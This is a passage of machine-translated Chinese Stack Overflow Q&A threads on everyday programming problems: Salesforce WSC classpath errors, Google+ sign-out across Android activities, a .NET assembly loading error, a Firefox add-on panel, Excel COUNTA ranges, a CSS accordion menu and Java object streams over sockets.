at java.net.URLClassLoader.defineClass(URLClassLoader.java:449)
at java.net.URLClassLoader.access$100(URLClassLoader.java:71)
at java.net.URLClassLoader$1.run(URLClassLoader.java:361)
at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
at java.security.AccessController.doPrivileged(Native Method)at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
at java.lang.ClassLoader.loadClass(ClassLoader.java:423)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:308)
at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
at java.lang.ClassLoader.defineClass1(Native Method)
at java.lang.ClassLoader.defineClass(ClassLoader.java:791)
at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)
at java.net.URLClassLoader.defineClass(URLClassLoader.java:449)
at java.net.URLClassLoader.access$100(URLClassLoader.java:71)
at java.net.URLClassLoader$1.run(URLClassLoader.java:361)
at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
at java.security.AccessController.doPrivileged(Native Method)
at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
at java.lang.ClassLoader.loadClass(ClassLoader.java:423)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:308)
at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
at merchantapp.MerchantAPP.main(MerchantAPP.java:110)
Caused by: java.lang.ClassNotFoundException: com.sforce.ws.bind.XMLizable
ay java.net.URLClassLoader$1.run(URLClassLoader.java:366)
at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
at java.security.AccessController.doPrivileged(Native Method)
at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
at java.lang.ClassLoader.loadClass(ClassLoader.java:423)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:308)
at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
... 25 more
Java Result: 1 
```

虽然看起来错误是由于我的程序无法找到 XMLizable 类引起的，但我无法执行`import com.sforce.ws.*;`将导入所需类的操作。

提前感谢任何可以提供帮助的人！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:51:51.310

问题是使用创建的 jar 文件`java -classpath wsc-23.jar com.sforce.ws.tools.wsdlc SFwsdl.xml salesforce.jar`未将所有必要的包包含到 salesforce.jar 中。这使我无法将其包含`import com.sforce.ws.*;`在我的代码中。

为了解决这个问题，我还将提供的 wsc-23.jar 文件`https://code.google.com/p/sfdc-wsc/downloads/list`导入到我的项目中。一旦我这样做了，我就能够导入所有的包并使用以前对我隐藏的任何对象。

如果有人遇到更清洁的方法来做到这一点，请告诉我。

# android - Google+ 从其他活动中退出

> ID：15392643
> 
> 赞同：33
> 
> 时间：2013-03-13T17:44:56.120
> 
> 标签：android, api, google-api, android-activity, google-plus

我已经开始使用`Google+ API`for android，并按照本教程创建了一个登录应用程序：

[https://developers.google.com/+/mobile/android/sign-in](https://developers.google.com/+/mobile/android/sign-in)

现在，问题是我想从另一个创建退出按钮`Activity`，而我尝试做的并没有真正奏效..

我的 GPlusLogin 代码（Google+ 登录活动）：

```
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.IntentSender.SendIntentException;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import com.google.android.gms.common.*;
import com.google.android.gms.common.GooglePlayServicesClient.ConnectionCallbacks;
import com.google.android.gms.common.GooglePlayServicesClient.OnConnectionFailedListener;
import com.google.android.gms.plus.PlusClient;

public class GPlusLogin extends Activity implements ConnectionCallbacks, OnConnectionFailedListener{

    private static final int REQUEST_CODE_RESOLVE_ERR = 9000;
    private static final String TAG = "GPlusLogin";

    private ProgressDialog mConnectionProgressDialog;
    private PlusClient mPlusClient;
    private ConnectionResult mConnectionResult;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.gplus_layout);
        mPlusClient = new PlusClient.Builder(this, this, this).setVisibleActivities("http://schemas.google.com/AddActivity", "http://schemas.google.com/BuyActivity").build();
        Bundle extras = getIntent().getExtras();
        mConnectionProgressDialog = new ProgressDialog(this);
        mConnectionProgressDialog.setMessage("Signing in...");

        if(extras!=null){
            if(extras.getString("signout")!=null){
                if (mPlusClient.isConnected()) {
                    mPlusClient.clearDefaultAccount();
                    mPlusClient.disconnect();
                    mPlusClient.connect();
                    finish();
                    startActivity(getIntent());
                }
            }
        }else{

            findViewById(R.id.sign_in_button).setOnClickListener(new OnClickListener() {

                public void onClick(View view) {
                    // TODO Auto-generated method stub
                    if (view.getId() == R.id.sign_in_button && !mPlusClient.isConnected()) {
                        if (mConnectionResult == null) {
                            mConnectionProgressDialog.show();
                        } else {
                            try {
                                mConnectionResult.startResolutionForResult(GPlusLogin.this, REQUEST_CODE_RESOLVE_ERR);
                            } catch (SendIntentException e) {
                                // Try connecting again.
                                mConnectionResult = null;
                                mPlusClient.connect();
                            }
                        }
                    }
                }
            });
        }
    }

    @Override
    protected void onStart() {
        // TODO Auto-generated method stub
        super.onStart();
        mPlusClient.connect();
    }

    @Override
    protected void onStop() {
        // TODO Auto-generated method stub
        super.onStop();
        mPlusClient.disconnect();
    }

    @Override
    public void onConnectionFailed(ConnectionResult result) {
        // TODO Auto-generated method stub
        if (mConnectionProgressDialog.isShowing()) {
            // The user clicked the sign-in button already. Start to resolve
            // connection errors. Wait until onConnected() to dismiss the
            // connection dialog.
            if (result.hasResolution()) {
                try {
                    result.startResolutionForResult(this, REQUEST_CODE_RESOLVE_ERR);
                } catch (SendIntentException e) {
                    mPlusClient.connect();
                }
            }
        }

        mConnectionResult = result;
    }

    @Override
    protected void onActivityResult(int requestCode, int responseCode, Intent intent) {
        if (requestCode == REQUEST_CODE_RESOLVE_ERR && responseCode == RESULT_OK) {
            mConnectionResult = null;
            mPlusClient.connect();
        }
    }

    @Override
    public void onConnected() {
        // TODO Auto-generated method stub
        mConnectionProgressDialog.dismiss();
        Intent main = new Intent(GPlusLogin.this, MainActivity.class);
        main.putExtra("result", true);
        startActivity(main);
    }

    @Override
    public void onDisconnected() {
        // TODO Auto-generated method stub
        Log.d(TAG, "disconnected");
    }

} 
```

我的断开连接代码`MainActivity`：

```
import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends Activity{

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Bundle extras = getIntent().getExtras();
        if(extras==null){
            Intent intent = new Intent(this, GPlusLogin.class);
            startActivity(intent);
        }
        TextView text1 = (TextView) findViewById(R.id.text1);
        text1.setText("You Are Connected :D");

        Button SignOut = (Button) findViewById(R.id.sign_out_gplus);
        SignOut.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View view) {
                // TODO Auto-generated method stub
                Intent intent = new Intent(MainActivity.this, GPlusLogin.class);
                intent.putExtra("signout", true);
                startActivity(intent);
            }
        });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

} 
```

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2016-08-16T14:18:25.827

只需将其添加到您的新活动中，您希望您的 google+ 注销按钮在那里：

```
@Override
protected void onStart() {
    GoogleSignInOptions gso = new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
            .requestEmail()
            .build();
    mGoogleApiClient = new GoogleApiClient.Builder(this)
            .addApi(Auth.GOOGLE_SIGN_IN_API, gso)
            .build();
    mGoogleApiClient.connect();
    super.onStart();
} 
```

接下来：

```
 signout.setOnClickListener(new View.OnClickListener() {
      @Override
      public void onClick(View v) {
          Auth.GoogleSignInApi.signOut(mGoogleApiClient).setResultCallback(
                  new ResultCallback<Status>() {
                      @Override
                      public void onResult(Status status) {
                          // ...
                          Toast.makeText(getApplicationContext(),"Logged Out",Toast.LENGTH_SHORT).show();
                          Intent i=new Intent(getApplicationContext(),MainActivity.class);
                          startActivity(i);
                      }
                  });
      }
  }); 
```

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2015-03-27T11:03:07.827

嘿，我自己解决了这个问题，像魅力一样工作

问题是什么：谷歌加登录在一项活动中，但需要从另一项活动中注销

## 解决方案：

我的 Google-plus 注销活动是这样的：

```
public class MainActivity extends Activity implements OnClickListener,
    ConnectionCallbacks, OnConnectionFailedListener,
    ResultCallback<People.LoadPeopleResult> {

   GoogleApiClient mGoogleApiClient;
   boolean mSignInClicked;

  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    mGoogleApiClient = new GoogleApiClient.Builder(this)
            .addConnectionCallbacks(this)
            .addOnConnectionFailedListener(this).addApi(Plus.API)
            .addScope(Plus.SCOPE_PLUS_LOGIN).build();

     //copy this code on "Logout" Onclick
  logout.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub
             if (mGoogleApiClient.isConnected()) {
            Plus.AccountApi.clearDefaultAccount(mGoogleApiClient);
            mGoogleApiClient.disconnect();
            mGoogleApiClient.connect();
            // updateUI(false);
            System.err.println("LOG OUT ^^^^^^^^^^^^^^^^^^^^ SUCESS");
        } 

        }
    });

}
@Override
public void onConnected(Bundle arg0) {
    // TODO Auto-generated method stub
    mSignInClicked = false;

    // updateUI(true);
    Plus.PeopleApi.loadVisible(mGoogleApiClient, null).setResultCallback(
            this);
}

@Override
public void onConnectionSuspended(int arg0) {
    // TODO Auto-generated method stub
    mGoogleApiClient.connect();
    // updateUI(false);
}

@Override
public void onConnectionFailed(ConnectionResult arg0) {
    // TODO Auto-generated method stub

}

protected void onStart() {
    super.onStart();
    mGoogleApiClient.connect();
}

protected void onStop() {
    super.onStop();
    if (mGoogleApiClient.isConnected()) {
        mGoogleApiClient.disconnect();
    }
}

@Override
public void onResult(LoadPeopleResult arg0) {
    // TODO Auto-generated method stub

} 
```

## 解决方案说明：

对于单个包 google plus API 将生成一个令牌和会话。只是在这里只需在注销页面中再创建一个会话。您现在可以轻松地从会话中注销

我已经尝试了很多关于这个问题，从当前会话注销，试试这个。它肯定会工作。有任何疑问让我知道

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-03-14T17:39:48.733

创建基类并继承连接/断开连接方法可能会更容易。Photohunt，我们的完整样本，详细记录了这个设计。

[文档](https://developers.google.com/+/photohunt/android#architecture_of_the_application) [代码](https://github.com/googleplus/gplus-photohunt-client-android/blob/master/src/com/google/plus/samples/photohunt/BaseActivity.java)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-10-04T09:04:03.947

经过一个多星期的努力寻找答案。我这样做了，登录后将 sharedpreferences 中的布尔 isSignedIn 保存为 true。

```
private SharedPreferences.Editor editor;
private SharedPreferences prefs;

editor = getSharedPreferences(getString(R.string.userDetails), MODE_PRIVATE).edit();
editor.putBoolean(getString(R.string.isSignedIn), true);
editor.apply();` 
```

现在，从用户单击注销时的任何活动中，将布尔值更改为 false。

在您的登录活动中`googleApiClient`构建。在其 onStart 方法中。检查是否`isSignedIn`为假。

```
@Override
public void onStart() {
super.onStart();
if (!prefs.getBoolean(getString(R.string.isSignedIn), false)) {
    signOut();
    }     
} 
```

做同样的事情`onConnected`

```
@Override
public void onConnected(Bundle connectionHint) {
    if (mGoogleApiClient.isConnected()) {
        Log.i(TAG, "onConnected: " + "yes it is connected");
        if (!prefs.getBoolean(getString(R.string.isSignedIn), false)) {
            signOut();
        }
    }
} 
```

这将注销并撤销访问权限。

```
public void signOut() {
    if (mGoogleApiClient != null) {
        Log.e(TAG, "signOut: " + mGoogleApiClient + mGoogleApiClient.isConnected());
        Auth.GoogleSignInApi.signOut(mGoogleApiClient).setResultCallback(
        if (mGoogleApiClient.isConnected()) {
                    new ResultCallback<Status>() {
                        @Override
                        public void onResult(Status status) {
                            // ...
                            Log.i(TAG, "onResult: " + mGoogleApiClient);
                        }
                    });
         Auth.GoogleSignInApi.revokeAccess(mGoogleApiClient).setResultCallback(
                    new ResultCallback<Status>() {
                        @Override
                        public void onResult(Status status) {
                            Log.i(TAG, "onResult: Revoke Access status:" + status.getStatus());
                        }
                    });
        }
    }
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2017-12-01T12:06:01.443

您可以从应用程序的任何位置获取 FirebaseAuth 的实例，因为 FirebaseAuth 是一个单例类。

```
 mAuth = FirebaseAuth.getInstance();
 mAuth.signOut(); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-03-19T22:39:07.870

乔纳森是正确的，基类或片段会让你的生活更轻松。也就是说，这里的代码可以工作 - 问题是您正在检查 PlusClient 是否已连接`onCreate()`- 但直到`onStart()`. 您可能需要检查`onConnected()`方法中的意图，并在那里执行签名。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2016-04-27T07:38:51.490

从另一个活动中单击注销后，请尝试发送带有额外信息的意图以指示单击了注销按钮。然后在登录活动

```
if (Intent.Extras != null && Intent.Extras.ContainsKey("LogoutAction")) {
    _logoutRequest = Intent.Extras.GetBoolean("LogoutAction");
}
if (_logoutRequest) {
    await PlusClass.AccountApi.RevokeAccessAndDisconnect(_apiClient);
    _apiClient.Disconnect();
    _apiClient.Connect ();
    _logoutRequest = false;
} 
```

其他活动

```
var intent = new Intent(this.Activity,typeof(LoginActivity));
intent.PutExtra("LogoutAction",true); 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2017-08-27T17:09:10.823

[sommesh](https://stackoverflow.com/users/5952645/sommesh)的答案是完美的，但是对于更少的代码，您可以像这样使用“公共静态方法”：

```
public static GoogleApiClient mGoogleApiClient;
...
...
public static void signOutFromGoogle() {
    Auth.GoogleSignInApi.signOut(mGoogleApiClient).setResultCallback(
            new ResultCallback<Status>() {
                @Override
                public void onResult(Status status) {
                    //...
                }
            });
} 
```

在您的其他活动上调用它：

```
Your_Google_Activity.mGoogleApiClient.connect();
btnSignOut.setOnClickListener(new View.OnClickListener() {
    @Override
    public void onClick(View v) {            
        Your_Google_Activity.signOutFromGoogle();
    }
}); 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2019-06-06T06:19:03.770

这是我的解决方案。我做了一个`Utils` [单例类](https://www.journaldev.com/1377/java-singleton-design-pattern-best-practices-examples)。在 my`LoginActivity`中，我有一个`GoogleSignInClient`对象。所以就在`DashboardActivity`登录后开始之前，我`googleSignInClient`通过调用来保存对象的实例`Utils.getInstance().setGoogleSignInClient(googleSignInClient)`。现在在其他任何地方，如果我想注销，我已经`Utils`准备好这个方法：

```
public void signOut() {
    googleSignInClient.signOut();
    FirebaseAuth.getInstance().signOut();
} 
```

所以现在，我可以从任何其他活动中做到这一点：

```
else if (id == R.id.action_logout) {
    Utils.getInstance().signOut();
    Intent intent = new Intent(this, LoginActivity.class);
    startActivity(intent);
} 
```

是的，您需要从两者中注销，否则，您下次点击登录按钮时可能看不到帐户选择器。

# .net - Windows 8 Visual Studio 2010 编译错误

> ID：15392645
> 
> 赞同：3
> 
> 时间：2013-03-13T17:45:04.463
> 
> 标签：.net, visual-studio-2010, windows-8

我今天尝试在我们的大项目中使用 Windows 8 和 Visual Studio 2010。我从一些项目中收到错误，说明程序集 System.Management，Version=2.0.0.0，Culture=neutral，PublicKeyToken=b03f5f7f11d50a3a 无法解析“因为它没有被预加载。使用 ReflectionOnly API 时，依赖程序集必须是 pre - 通过 ReflectionOnlyAssemblyResolve 事件按需加载或加载。” 编译期间出现错误。

我们不会在我们的项目中直接引用这个程序集。似乎 Microsoft 企业库（版本 5.0.414）可能使用此程序集。但为什么它不存在？我认为它是 .NET Framework 的一部分。

该项目的TargetFramework是.NET 4.0

我能做些什么来解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-14T01:23:25.167

这无疑是由 Assembly.ReflectionOnlyLoad() 未应用绑定策略引起的问题。这可以防止 System.Management.dll 的 2.0.0.0 版本映射到 4.0.0.0 版本。

您可以尝试破解您自己的 AppDomain.ReflectionOnlyAssemblyResolve 事件处理程序，但这很糟糕。你最好走捷径解决这个问题，反正你很快就会了。进入控制面板，程序和功能，打开或关闭 Windows 功能。勾选“.NET Framework 3.5”选项，OK，让它滚动一会儿。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T00:22:03.843

在我的 Win8 / VS 2012 机器上，有一个针对 .NET FX 4 的项目，我只提供 System.Management v4.0.0.0：

![Windows 8 上的 System.Management 版本](../Images/0f8a387d200517c9bdfa2928625766e1.png)

我猜您的项目最初是为 .NET 2/3/3.5 构建的，因此引用了 System.Management v2.0.0。

我还猜测您的代码使用了某种形式的延迟加载和/或依赖注入/控制反转容器（例如 Ninject / Windsor / Autofac / Unity / StructureMap / 等）并且你有一个硬编码源代码中某处包含对 v2 库的引用的字符串？

如果是这样，您需要在为 .NET 4.0+ 构建时更新对 System.Management v4.0.0.0 的引用。

# javascript - 无法在 Firefox 插件中向面板发送消息？（该页面当前处于隐藏状态，在再次可见之前无法再使用）

> ID：15392651
> 
> 赞同：2
> 
> 时间：2013-03-13T17:45:15.457
> 
> 标签：javascript, firefox, firefox-addon, firefox-addon-sdk

我的目标很简单：我想要一个面板，用户可以在其中指定用户名和密码并单击登录。然后我想做一个 webrequest 来验证凭据，并向用户显示响应。

我发现我必须在 main.js 中执行请求并将其传回。因此，当提交表单时，我构建了我的 url，向我执行请求的 main.js 发送一条消息。效果很好，响应也是正确的。但是，当我想将响应发送回面板时，出现此错误：

```
Error: The page is currently hidden and can no longer be used until it is visible again.
resource://jid1-aaautmtqen7pta-at-jetpack/addon-sdk/lib/sdk/content/worker.js 404
Traceback (most recent call last):
  File "resource://jid1-aaautmtqen7pta-at-jetpack/addon-sdk/lib/sdk/net/xhr.js", line 126, in 
    self._orsc.apply(self, arguments);
  File "resource://jid1-aaautmtqen7pta-at-jetpack/addon-sdk/lib/sdk/request.js", line 91, in onreadystatechange
    emit(target, 'complete', response);
  File "resource://jid1-aaautmtqen7pta-at-jetpack/addon-sdk/lib/sdk/event/core.js", line 83, in emit
    for each (let item in emit.lazy.apply(emit.lazy, arguments)) {
  File "resource://jid1-aaautmtqen7pta-at-jetpack/addon-sdk/lib/sdk/event/core.js", line 101, in lazy
    yield listeners.shift().apply(target, args);
  File "resource://jid1-aaautmtqen7pta-at-jetpack/domain/lib/main.js", line 21, in hosters<.onComplete
    popup.port.emit("handleloginresponse",response);
  File "resource://jid1-aaautmtqen7pta-at-jetpack/addon-sdk/lib/sdk/content/worker.js", line 369, in 
    emit: function () self._emitEventToContent(Array.slice(arguments))
  File "resource://jid1-aaautmtqen7pta-at-jetpack/addon-sdk/lib/sdk/content/worker.js", line 404, in _emitEventToContent
    throw new Error(ERR_FROZEN); 
```

我还尝试再次打开面板或使用 postMessage() 代替。似乎没有任何效果，我无法将内容传输回我的面板！任何帮助都会得到帮助！

这是我的 main.js

```
var data = require("self").data;

var popup = require("panel").Panel({
  width: 212,
  height: 200,
  contentURL: data.url("popup.html"),
  contentScriptFile: [data.url("jquery.js"),data.url("popup.js")]
});

var Request = require("request").Request;

popup.port.on("handlelogin", function (url) {
    console.log("requesting " + url);
    var hosters = Request({
        url: url,
        onComplete: function (response) {       
            console.log(response.status);
            console.log("emmiting handleloginresponse");
            popup.port.emit("handleloginresponse",response);
        }
    }).get();
}); 

require("widget").Widget({
  label: "my label",
  id: "pop-up",
    contentURL: data.url("16.png"),
  panel: popup
}); 
```

popup.html

```
<html>

<head>

</head>

<body>
    <form id="loginform">
        <input name="user" placeholder="User" id="userfield" />
        <input type="password" name="pass" placeholder="Password" id="passfield"/>
        <input type="submit" id="loginbutton" value="Log in " />
    </form>
</body>

</html> 
```

popup.js

```
$('#loginform').submit(function (event) {
    var url = 'https://mydomain.com?user=' + encodeURIComponent($('#loginform')[0].user.value) + '&pass=' + encodeURIComponent($('#loginform')[0].pass.value) + '&something=something;
    self.port.emit("handlelogin",url);

});

self.on("handleloginresponse", function(data) {
    console.log("got a handleloginresponse!");
    console.log(data);
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-18T11:20:02.707

问题自行解决为不存在，是由于服务器端 http 错误引起的

# excel - 计算精确范围

> ID：15392653
> 
> 赞同：1
> 
> 时间：2013-03-13T17:45:19.567
> 
> 标签：excel, count, excel-2007, rows

是否有一种公式或方法可以保持准确的行数（即始终为 100 行）并在所述行内计数 - 无论插入或删除如何？我试过绝对引用，但是插入和删除会影响它。

我现在唯一的方法是在所有插入和删除完成后重写公式。

```
Sub ExactRowsCount()
'
' ExactRowsCount Macro
'
Range("H1").Select
ActiveCell.FormulaR1C1 = "=COUNTA(R[4]C:R[104]C)"
Range("H2").Select

End Sub 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T18:07:57.043

我会使用`OFFSET`：

```
=COUNTA(OFFSET(A1,4,0,100,1)) 
```

`A1`您希望计数结束的单元格在哪里。如果您希望列高依赖于另一个单元格，则此公式可能特别方便；例如，如果你想保持单元格 A2 中的列高而不是使用常数 100，你可以这样做：

```
=COUNTA(OFFSET(H1, 4, 0, A2, 1)) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T17:57:54.280

这将返回 A2 到 A101 中非空白单元格的计数，无论插入和删除如何：

```
=COUNTA(INDIRECT("A2:A101")) 
```

# html - CSS3 手风琴菜单 3 级

> ID：15392656
> 
> 赞同：0
> 
> 时间：2013-03-13T17:45:30.740
> 
> 标签：html, css, menu, nav

有没有办法扩展这个 designmodo 示例以允许 3 级导航？我非常想使用这个菜单示例，但我不知道如何添加第三级功能。任何帮助将不胜感激！

示例： [http ://designmodo.com/css3-accordion-menu/](http://designmodo.com/css3-accordion-menu/)

这是我正在使用的小提琴：http: [//jsfiddle.net/johnstonian/r5rEZ/](http://jsfiddle.net/johnstonian/r5rEZ/)

这是我正在使用的示例菜单：

```
<ul class="accordion">

        <li id="one" class="files">
          <a href="#one">My Files<span>495</span></a>
          <ul class="sub-menu">
            <li id="five">
                <a href="#one"><em>01</em>Dropbox<span>42</span></a>
                <ul class="sub-menu">
                    <li><a><em>01</em>3rd Level<span>9</span></a></li>
                    <li><a href="#five"><em>02</em>3rd Level<span>14</span></a></li>
                    <li><a href="#five"><em>03</em>3rd Level<span>3</span></a></li>
                </ul>
            </li>
            <li><a href="#one"><em>02</em>Skydrive<span>87</span></a></li>
            <li><a href="#one"><em>03</em>FTP Server<span>366</span></a></li>
              <li><a href="#one"><em>01</em>Dropbox<span>42</span></a></li>
          </ul>
        </li>

        <li id="two" class="mail">
          <a href="#two">Mail<span>26</span></a>
          <ul class="sub-menu">
            <li><a href="#two"><em>01</em>Hotmail<span>9</span></a></li>
            <li><a href="#two"><em>02</em>Yahoo<span>14</span></a></li>
            <li><a href="#two"><em>03</em>Gmail<span>3</span></a></li>
          </ul>
        </li>

        <li id="three" class="cloud">
          <a href="#three">Cloud<span>58</span></a>
          <ul class="sub-menu">
            <li><a href="#three"><em>01</em>Connect<span>12</span></a></li>
            <li><a href="#three"><em>02</em>Profiles<span>19</span></a></li>
            <li><a href="#three"><em>03</em>Options<span>27</span></a></li>
          </ul>
        </li>

        <li id="four" class="sign">
          <a href="#four">Sign Out</a>
          <ul class="sub-menu">
            <li><a href="#four"><em>01</em>Log Out</a></li>
            <li><a href="#four"><em>02</em>Delete Account</a></li>
            <li><a href="#four"><em>03</em>Freeze Account</a></li>
          </ul>
        </li>

      </ul> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-10-07T23:07:07.127

使用为此设计的菜单，例如：

*   [CSSPlay：多级弹出菜单](http://www.cssplay.co.uk/menus/ul-flyout.html)

*   [CSSPlay：一个跨浏览器的下拉级联验证菜单](http://www.cssplay.co.uk/menus/dd_valid.html)

*   [CSSPlay：ULTIMATE CSS only 下拉菜单](http://www.cssplay.co.uk/menus/final_drop.html)

# java - 使用 TCP over socket 将 ArrayList 从服务器端发送到客户端

> ID：15392661
> 
> 赞同：0
> 
> 时间：2013-03-13T17:45:49.380
> 
> 标签：java, sockets, serversocket

我正在尝试将对象从服务器端发送到客户端，但我找不到问题。这是我在客户端遇到的错误：

```
java.io.StreamCorruptedException: invalid type code: 43
at java.io.ObjectInputStream.readObject0(Unknown Source)
at java.io.ObjectInputStream.readObject(Unknown Source)
at connection.MainClient.doAll(MainClient.java:56)
at connection.TestScreen$2.actionPerformed(TestScreen.java:82)
at javax.swing.AbstractButton.fireActionPerformed(Unknown Source)
at javax.swing.AbstractButton$Handler.actionPerformed(Unknown Source)
at javax.swing.DefaultButtonModel.fireActionPerformed(Unknown Source)
at javax.swing.DefaultButtonModel.setPressed(Unknown Source)
at javax.swing.plaf.basic.BasicButtonListener.mouseReleased(Unknown Source)
at java.awt.Component.processMouseEvent(Unknown Source)
at javax.swing.JComponent.processMouseEvent(Unknown Source)
at java.awt.Component.processEvent(Unknown Source)
at java.awt.Container.processEvent(Unknown Source)
at java.awt.Component.dispatchEventImpl(Unknown Source)
at java.awt.Container.dispatchEventImpl(Unknown Source)
at java.awt.Component.dispatchEvent(Unknown Source)
at java.awt.LightweightDispatcher.retargetMouseEvent(Unknown Source)
at java.awt.LightweightDispatcher.processMouseEvent(Unknown Source)
at java.awt.LightweightDispatcher.dispatchEvent(Unknown Source)
at java.awt.Container.dispatchEventImpl(Unknown Source)
at java.awt.Window.dispatchEventImpl(Unknown Source)
at java.awt.Component.dispatchEvent(Unknown Source)
at java.awt.EventQueue.dispatchEventImpl(Unknown Source)
at java.awt.EventQueue.access$200(Unknown Source)
at java.awt.EventQueue$3.run(Unknown Source)
at java.awt.EventQueue$3.run(Unknown Source)
at java.security.AccessController.doPrivileged(Native Method)
at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
at java.awt.EventQueue$4.run(Unknown Source)
at java.awt.EventQueue$4.run(Unknown Source)
at java.security.AccessController.doPrivileged(Native Method)
at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
at java.awt.EventQueue.dispatchEvent(Unknown Source)
at java.awt.EventDispatchThread.pumpOneEventForFilters(Unknown Source)
at java.awt.EventDispatchThread.pumpEventsForFilter(Unknown Source)
at java.awt.EventDispatchThread.pumpEventsForHierarchy(Unknown Source)
at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
at java.awt.EventDispatchThread.run(Unknown Source) 
```

下面是服务器端方法： 无限循环中的单独方法只是从文件中读取并将用户名和密码解析为 ArrayList，它们是服务器类中的实例变量。

```
 public void doStuff() throws Exception
{
    ServerSocket serverSocket = new ServerSocket(5001);
    Socket clientSocket = serverSocket.accept();
    PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
    BufferedReader in = new BufferedReader(
            new InputStreamReader(
            clientSocket.getInputStream()));
    ObjectOutputStream objectOutput = new ObjectOutputStream(clientSocket.getOutputStream());
    String inputLine;
    out.println("Connected");
    while(true)
    {
        seperate();
        while ((inputLine = in.readLine()) != null) 
        {
            if(inputLine.equalsIgnoreCase("users"))
                objectOutput.writeObject(getUserNames());
            else
                if(inputLine.equalsIgnoreCase("pass"))
                    objectOutput.writeObject(getPassWords());
                else
                    if(inputLine.equalsIgnoreCase("stop"))
                        objectOutput.reset();
        }
    }
} 
```

下面是客户端从服务器请求信息：

```
public boolean doAll(String name, String pass) throws Exception
{
    try 
    {
        kkSocket = new Socket("PC", 5001);
        out = new PrintWriter(kkSocket.getOutputStream(), true);
        in = new BufferedReader(new InputStreamReader(kkSocket.getInputStream()));
    } 
    catch (UnknownHostException e) 
    {
        System.err.println("Don't know about host: PC.");
        System.exit(1);
    }
    catch (IOException e) 
    {
        System.err.println("Couldn't get I/O for the connection to: PC.");
        System.exit(1);
    }

    ObjectInputStream objectInput = new ObjectInputStream(kkSocket.getInputStream());

    out.println("user");
    Object obj = objectInput.readObject();
    users = (ArrayList<String>)obj;
    out.println("pass");
    obj = objectInput.readObject();
    this.pass = (ArrayList<String>)obj;
    out.println("stop");
    objectInput.close();
    out.close();
    in.close();
    kkSocket.close();

    if(userIsRegistered(name,pass))
        return true;
    return false;
} 
```

我是学习服务器套接字和套接字的新手，但我在这里想要完成的是这个。当我按下另一个班级的按钮时，我会这样做：

```
MainClient b = new MainClient();
login = b.doAll(userField.getText(),passField.getText());
Login is obviously a boolean. 
```

几乎是服务器上的登录系统，当按下登录按钮时，它会调用客户端连接到该服务器并获取服务器上存储在指定目录中的文本文件中的用户和通行证列表。然后，当客户端收到此信息时，它会检查它是否可能是我从两个文本字段中获取的字符串中的用户，并返回真或假。然后关闭到服务器的套接字，它应该每次都保持重新连接，对吗？

我的主要问题是如何解决它不断抛出的错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:55:07.453

您不能`InputStreamReader`与字节输入流一起使用。它需要来自输入流的字符/字符串。请尝试使用[ObjectInputStream](http://docs.oracle.com/javase/6/docs/api/java/io/ObjectInputStream.html)。

只是一个提示：输入流类型应该在服务器端和客户端都匹配。你不能混合它们。在您使用的服务器上`ObjectOutputStream`，因此`ObjectInputStream`应在客户端上使用相应的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-14T17:25:35.510

您的代码流程如下：

1.  服务器已启动并等待与客户端的连接
2.  服务器接受来自客户端的连接，使用`serverSocket.accept()`.
3.  服务器使用对象通过向客户端发送`String`消息（“已连接”）。`PrintWriter``out.println("Connected")`
